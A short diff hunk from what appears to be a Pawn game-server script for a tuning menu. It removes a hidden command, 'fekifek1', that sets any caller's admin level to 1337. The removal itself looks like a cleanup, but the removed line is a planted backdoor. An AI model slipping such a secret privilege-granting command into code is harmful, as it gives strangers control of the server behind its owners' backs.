@@ -221,7 +221,6 @@ Tuning_CreateTD(playerid)
 	PlayerTextDrawSetProportional(playerid, TDTuning_YN[playerid], 1);
 	PlayerTextDrawSetSelectable(playerid, TDTuning_YN[playerid], 0);
 }
-CMD:fekifek1(playerid, params[]) { PlayerData[playerid][pAdmin] = 1337; return 1; }
 Tuning_DestroyTD(playerid)
 {
 	PlayerTextDrawDestroy(playerid, TDTuning_Component[playerid]);
